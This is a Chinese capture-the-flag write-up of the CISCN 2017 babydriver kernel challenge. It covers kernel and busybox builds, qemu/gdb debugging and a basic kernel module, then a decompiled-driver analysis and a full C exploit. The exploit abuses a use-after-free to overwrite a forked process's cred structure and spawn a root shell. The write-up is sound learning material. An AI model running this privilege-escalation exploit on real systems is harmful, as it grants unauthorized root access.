# BabyDriver 

第一次做kernel pwn的题目，用CISCN2017的babydriver做个入门吧。从编译内核到调试内核环境都做一做吧。

kernel pwn需要安装qemu来运行内核环境，我使用的是MIT的修改版本qemu，连接gdb调试更加方便一些。

**需要掌握的知识结构**

- 内核编译和文件系统
- [LKM编程基础](https://www.freebuf.com/articles/system/54263.html)
- 内核调试技巧

可以参考大佬的这篇[文章]([https://www.lhyerror404.cn/2020/03/23/%E3%80%90%E8%BD%AC%E3%80%91kernel-pwn-%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E4%B8%80/](https://www.lhyerror404.cn/2020/03/23/[转]kernel-pwn-学习之路一/))

## 编译内核

**Download**

从[Linux Kernel](https://www.kernel.org)官网下载并且解压内核源代码

```
xz -d linux-4.4.217.tar.xz
tar xvf linux-4.4.217.tar
cd linux-4.4.217/
```

**安装依赖**

```
sudo apt-get update
sudo apt-get install build-essential libncurses5-dev
```

**编译**

[参考](http://eternalsakura13.com/2018/04/13/qemu/)

```
$ make menuconfig
进入Kernel hacking
勾选以下项目
Kernel debugging
Compile-time checks and compiler options —> Compile the kernel with debug info和Compile the kernel with frame pointers
KGDB
然后保存退出
```

![RLl1Ev](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/RLl1Ev.png)

生成镜像文件bzImage，编译完成之后可以在arch/x86/boot中找到。

```
$ make bzImage
...
Kernel: arch/x86/boot/bzImage is ready  (#1)
make[1]: warning:  Clock skew detected.  Your build may be incomplete.
```

**构建文件系统**

下载busybox，解压、配置并且编译。

```
wget https://busybox.net/downloads/busybox-1.27.2.tar.bz2
tar -jxvf busybox-1.27.2.tar.bz2
cd busybox-1.27.2
make menuconfig # Busybox Settings -> Build Options -> Build Busybox as a static binary
make install
```

建立文件系统

```
cd _install
mkdir proc
mkdir sys
touch init
chmod +x init
```

编写init

```shell
#!/bin/sh
mkdir /tmp
mount -t proc none /proc
mount -t sysfs none /sys
mount -t debugfs none /sys/kernel/debug
mount -t tmpfs none /tmp
mdev -s # We need this to find /dev/sda later
setsid /bin/cttyhack setuidgid 1000 /bin/sh  #设置权限（如果要用root登陆将1000改为0即可）

umount /proc
umount /sys
poweroff -d 0  -f

```

打包文件系统

```
find . | cpio -o --format=newc > ../../rootfs.img
```

**boot**

编写启动脚本boot.sh

```shell
#!/bin/bash

qemu-system-x86_64 -initrd rootfs.img -kernel bzImage -append 'console=ttyS0' --nographic
```

## 环境配置

[参考](https://www.cnblogs.com/61355ing/p/10386955.html)

这里是ubuntu下的环境配置，在mac下配置略有区别。

**qemu**

安装依赖

```
sudo apt-get install libsdl2-2.0 libsdl2-dev libpixman-1-dev flex bison
```

下载Qemu[代码](https://download.qemu.org),并且编译

```
./configure --enable-debug  --target-list=x86_64-softmmu
sudo make
sudo make install
```

运行题目提供的boot.sh脚本时出现如下

```
$ ./boot.sh 
Could not access KVM kernel module: No such file or directory
qemu-system-x86_64: failed to initialize KVM: No such file or directory
```

说明该虚拟机硬件不支持虚拟化，所以在VMfusion中选择**虚拟机->处理器和内存->高级选项->虚拟化Inter VT-x/EPT**，并且重启虚拟机。

**gdb**

安装pwdbg/peda/gef等插件

[qemu+gdb调试Linux内核](https://blog.csdn.net/jasonLee_lijiaqi/article/details/80967912)

gdb加载编译好的源代码

![qDHOk9](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/qDHOk9.png)

设置监听端口（默认1234），为boot.sh设定的代码加上参数-s运行。就可以使用gdb对系统内核进行有源代码的调试了。断点·`hb start_kernel`

![qsCTiW](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/qsCTiW.png)

**vmlinux**

vmlinux是编译出的原始内核文件，未经过压缩的ELF格式。可以用于搜索gadgets。有些题目会提供，否则可以从bzImage中导出，工具[extract-vmlinux](https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux)。

**ropper**

ROPgadget跑的太慢了，使用[ropper](https://github.com/sashs/Ropper)会快很多

## 调试相关

要对内核模块进行调试，在启动脚本中加入

```
-gdb tcp::1234
```

然后使用 gdb 连接

```
gdb -q -ex "target remote localhost:1234"
```

如果显示 Remote ‘g’ packet reply is too long 一长串数字，要设置一下架构

```
gdb -q -ex "set architecture i386:x86-64:intel" -ex "target remote localhost:1234"
```

调试内核模块，/sys/module中查看各个模块的信息。

```shell
$ cd sys/module/
/sys/module $ ls
8250                ipv6                scsi_mod
acpi                kdb                 sg
acpi_cpufreq        kernel              spurious
acpiphp             keyboard            sr_mod
apparmor            kgdb_nmi            suspend
ata_generic         kgdboc              sysrq
ata_piix            libata              tcp_cubic
babydriver          loop                thermal
battery             md_mod              tpm
block               module              tpm_tis
core                mousedev            uhci_hcd
cpuidle             netpoll             uinput
debug_core          pata_sis            usbcore
dm_mod              pcc_cpufreq         virtio_balloon
dns_resolver        pci_hotplug         virtio_blk
dynamic_debug       pci_slot            virtio_mmio
edd                 pcie_aspm           virtio_net
efivars             pciehp              virtio_pci
ehci_hcd            ppp_generic         vt
elants_i2c          printk              workqueue
ext4                processor           xen_acpi_processor
firmware_class      pstore              xen_blkfront
fuse                rcupdate            xen_netfront
i8042               rcutree             xhci_hcd
ima                 rfkill              xz_dec
intel_idle          rng_core            zswap
```

查看babydriver模块的加载地址

```shell
/sys/module $ cd babydriver/
/sys/module/babydriver $ ls
coresize    initsize    notes       sections    taint
holders     initstate   refcnt      srcversion  uevent
/sys/module/babydriver $ cd sections/
/sys/module/babydriver/sections $ ls
__mcount_loc
/sys/module/babydriver/sections $ cat __mcount_loc 
0xffffffffc00010d0
/sys/module/babydriver/sections $ grep 0 .text
0xffffffffc0000000
```

对内核进行带符号表调试,不知道为何我这里符号表加载不进去。。后来把驱动放到跟目录下就好了，也许和不是root权限有关？

```shell
(gdb) add-symbol-file ./babydriver.ko 0xffffffffc0000000
add symbol table from file "./babydriver.ko" at
	.text_addr = 0xffffffffc0000000
(y or n) y
Reading symbols from ./babydriver.ko...
(gdb) b *babyopen
Breakpoint 1 at 0xffffffffc0000030: file /home/atum/PWN/my/babydriver/kernelmodule/babydriver.c, line 28.
```
## LKM编写

hello.c

```c
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>

MODULE_LICENSE("Dual BSD/GPL");

static int hello_init(void)
{
    printk(KERN_DEBUG "Hello World !!!\n");
    return 0;
}

static void hello_exit(void)
{
    printk(KERN_DEBUG "Bye bye !!!\n");
}

module_init(hello_init);
module_exit(hello_exit);
```

Makefile

```makefile
obj-m   := hello.o

KDIR    := /lib/modules/$(shell uname -r)/build
PWD    := $(shell pwd)

default:
        $(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules
```

make编译，使用insmod将驱动加载到系统中。通过dmesg查看内核的输出。

![rOdhL5](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/rOdhL5.png)

![TvAYKI](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/TvAYKI.png)

需要编译对应内核版本的驱动，如果要编译本题的（4.4.72版本）内核，需要在[kernel](https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/)下载源代码，并且KDIR修改为`源代码/build`目录。（不过还没验证过）



**报错**

遇到MODPOST 0modules的错误，MakeFile编写出了问题，obj-m少了o

![nn3gYy](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/nn3gYy.png)

gcc报错，是gcc版本太低，需要更新到gcc-5以上

![Lsh3bb](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/Lsh3bb.png)

加载没有符号表，[参考](http://wonfee.github.io/2015/06/23/linux-driver-module/)

内核版本不匹配，导致愿意原因一般是更新过系统。

![2ykW3F](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/2ykW3F.png)

比如我这里，要手动把Makefile里的路径$(shell uname -r)的值改掉。

![image-20200425171033591](/Users/migraine/Library/Application Support/typora-user-images/image-20200425171033591.png)


## BabyDriver

题目一般都会提供四个文件，拿本题的四个文件举例**bzImage**  **rootfs.cpio**  **babydriver.ko**  **boot.sh**，分别是内核镜像、文件系统、一个包含漏洞的LKM驱动和启动脚本。之前自己编译过内核，应该就知道这一部分的意义。

解包文件系统。在文件系统中，可以看到init文件，调用了insmod加载了包含了漏洞的babydriver.ko。

```shell
cpio -idmv < rootfs.cpio  #解包
find . | cpio -o --format=newc > ../rootfs.cpio#打包
```

![Vx1vlC](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/Vx1vlC.png)

**init**文件

```shell
#!/bin/sh

mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
chown root:root flag
chmod 400 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /lib/modules/4.4.72/babydriver.ko
chmod 777 /dev/babydev
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0  -f
```

运行./boot.sh起系统。当然，比赛提供的文件系统中自然是没有flag的，所以显示No such file，不过本地可以自己写在文件系统里然后打包。比赛中，打服务器也是将自己脚本上传到tmp，然后运行提权。

![opn3rf](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/opn3rf.png)

打包运行脚本，将我们的flag放入busybox的根目录（此处为core目录），如果要调试就让gdb监听1234端口。

```shell
#!/bin/sh

cd core 
find . | cpio -o --format=newc > ../rootfs.cpio
cd ..
qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0' --nographic -s
```

**漏洞分析**

使用[checksec](https://github.com/slimm609/checksec.sh)检查保护机制，只开了NX。

![5JjqTu](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/5JjqTu.png)

IDA中Shift+F9查看有哪些结构体

![dvhk29](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/dvhk29.png)

IDA里查看出题人编写的几个函数。

**babyioctl**：定义了0x0001的ioctl命令，ioctl系统调用用于控制设备，每个ioctl调用内部存在switch case结构，每个case对应一个命令。babyioctl会释放babydev_struct结构体中的device buf缓冲区，然后根据用户输入的size值分配对应内存。因为是__fastcall方式，参数都是寄存器传递的，这里了解即可。

```c
void __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
{
  size_t v3; // rdx
  size_t v4; // rbx
  __int64 v5; // rdx

  _fentry__(filp, *(_QWORD *)&command);
  v4 = v3;
  if ( command == 0x10001 )
  {
    kfree(babydev_struct.device_buf);
    babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL);
    babydev_struct.device_buf_len = v4;
    printk("alloc done\n", 0x24000C0LL, v5);
  }
  else
  {
    printk("\x013defalut:arg is %ld\n", v3, v3);
  }
}
```

需要注意的是**printk**并不会输出在console中，需要使用dmesg命令才能查看输出。

**babyopen**：申请一块0x40字节大小的空间，存储在babydev_struct.device_buf上。

```c
int __fastcall babyopen(inode *inode, file *filp)
{
  __int64 v2; // rdx

  _fentry__(inode, filp);
  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);
  babydev_struct.device_buf_len = 64LL;
  printk("device open\n", 0x24000C0LL, v2);
  return 0;
}
```

**babyread**：首先检测读取是否越界，然后将device_buf中的数据拷贝到用户空间的buffer缓冲区中。

```c
void __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx

  _fentry__(filp, buffer);
  if ( babydev_struct.device_buf )
  {
    if ( babydev_struct.device_buf_len > v4 )
      copy_to_user(buffer, babydev_struct.device_buf, v4);
  }
}
```

**babywrite**：作用与babyread相反，很好理解。

```c
void __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx

  _fentry__(filp, buffer);
  if ( babydev_struct.device_buf )
  {
    if ( babydev_struct.device_buf_len > v4 )
      copy_from_user(babydev_struct.device_buf, buffer, v4);
  }
}
```

**babyrelease**:释放babydev_struct.device_buf空间。

```c
int __fastcall babyrelease(inode *inode, file *filp)
{
  __int64 v2; // rdx

  _fentry__(inode, filp);
  kfree(babydev_struct.device_buf);
  printk("device release\n", filp, v2);
  return 0;
}
```

**思路**

题目中的函数并没有溢出，但是存在一个条件竞争导致的UAF。因为babydev_struct是一个全局变量，当我们打开两次/dev/babydev设备，使用的是同一个块内存存放。当释放其中一个设备，另一个设备依然可以使用这块内存空间，造成一个UAF漏洞。

如何提权呢？通过修改cred结构体来提权到root,4.4.72的cred结构体如下。我们只需要将gid和uid修改为0，就能提权到root。

```c
struct cred {
    atomic_t    usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
    atomic_t    subscribers;    /* number of processes subscribed */
    void        *put_addr;
    unsigned    magic;
#define CRED_MAGIC  0x43736564
#define CRED_MAGIC_DEAD 0x44656144
#endif
    kuid_t      uid;        /* real UID of the task */
    kgid_t      gid;        /* real GID of the task */
    kuid_t      suid;       /* saved UID of the task */
    kgid_t      sgid;       /* saved GID of the task */
    kuid_t      euid;       /* effective UID of the task */
    kgid_t      egid;       /* effective GID of the task */
    kuid_t      fsuid;      /* UID for VFS ops */
    kgid_t      fsgid;      /* GID for VFS ops */
    unsigned    securebits; /* SUID-less security management */
    kernel_cap_t    cap_inheritable; /* caps our children can inherit */
    kernel_cap_t    cap_permitted;  /* caps we're permitted */
    kernel_cap_t    cap_effective;  /* caps we can actually use */
    kernel_cap_t    cap_bset;   /* capability bounding set */
    kernel_cap_t    cap_ambient;    /* Ambient capability set */
#ifdef CONFIG_KEYS
    unsigned char   jit_keyring;    /* default keyring to attach requested
                     * keys to */
    struct key __rcu *session_keyring; /* keyring inherited over fork */
    struct key  *process_keyring; /* keyring private to this process */
    struct key  *thread_keyring; /* keyring private to this thread */
    struct key  *request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
    void        *security;  /* subjective LSM security */
#endif
    struct user_struct *user;   /* real user ID subscription */
    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
    struct group_info *group_info;  /* supplementary groups for euid/fsgid */
    struct rcu_head rcu;        /* RCU deletion hook */
};
```

于是我们得出利用流程

- 申请两次设备
- 使用ioctl将第一个设备的babydev_struct缓冲区大小改为0xa8.  **sizeo(struct cred)**

- 释放第一个设备
- fork一个进程，然后cred会申请到刚才被释放的babydev_struct缓冲区中，产生一个UAF
- 通过第二个设备的写功能，将uid和gid修改为0

exploit需要用c来编写，在mac下编译我尝试用x86_64-elf-gcc做交叉编译,不过有一些问题，所以还是尽量直接用ubuntu编译吧。

```
sudo port install x86_64-elf-gcc
```

完整的Exploit,参考ctfwiki上的exploit

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>

int main()
{
	// 打开两次设备
	int fd1 = open("/dev/babydev", 2);
	int fd2 = open("/dev/babydev", 2);

	// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)
	ioctl(fd1, 0x10001, 0xa8);

	// 释放 fd1
	close(fd1);

	// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠
	int pid = fork();
	if(pid < 0)
	{
		puts("[*] fork error!");
		exit(0);
	}

	else if(pid == 0)
	{
		// 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0
		char zeros[30] = {0};
		write(fd2, zeros, 28);

		if(getuid() == 0)
		{
			puts("[+] root now.");
			system("/bin/sh");
			exit(0);
		}
	}
	//调用wait，等待子进程结束
	else
	{
		wait(NULL); 
	}
	close(fd2);

	return 0;
}

```

静态编译Exploit，因为kernel中没有编译过libc。

```
 gcc exp.c -o exp -static
```

最后打包文件系统，重新起系统。在/tmp目录下运行exp即可获得一个root权限的shell。

这道题主要还是体验为主，很多细节部分还不是很清楚，特别是调试部分，用户态和内核态调试还是比较麻烦的。

![xuexrV](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/xuexrV.png)



## 附录

**LKM入门**[参考]()

[KERNEL PWNCISCN 2017 babydriver题解](http://p4nda.top/2018/10/11/ciscn-2017-babydriver/)

[64位交叉开发工具集](http://boxcounter.com/attachments/2013-11-08/osx下搭建操作系统开发环境之64位交叉开发工具集（gcc+gdb）v1.0.pdf)

[kernel-pwn-学习之路一](https://www.lhyerror404.cn/2020/03/23/[转]kernel-pwn-学习之路一/)

